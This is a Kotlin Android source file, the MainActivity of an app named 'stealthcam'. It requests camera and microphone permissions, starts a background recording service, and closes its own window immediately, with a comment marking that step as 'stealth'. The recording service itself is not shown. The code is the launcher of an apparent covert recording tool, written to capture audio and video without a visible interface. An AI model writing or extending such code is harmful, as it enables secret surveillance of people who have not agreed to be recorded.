package com.marius.stealthcam

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {
  private val REQ = 101
  private val perms = arrayOf(Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO)

  override fun onCreate(savedInstanceState: Bundle?) {
    super.onCreate(savedInstanceState)
    ensurePerms { startRecordingService() }
  }

  private fun ensurePerms(then: () -> Unit) {
    val missing = perms.filter { checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED }
    if (missing.isEmpty()) then()
    else requestPermissions(missing.toTypedArray(), REQ)
  }

  override fun onRequestPermissionsResult(code: Int, p: Array<out String>, r: IntArray) {
    if (code == REQ && r.all { it == PackageManager.PERMISSION_GRANTED }) startRecordingService()
    else finish()
  }

  private fun startRecordingService() {
    val i = Intent(this, recorder.RecordingService::class.java)
    if (Build.VERSION.SDK_INT >= 26) startForegroundService(i) else startService(i)
    finish() // stealth: închide activity-ul
  }
}
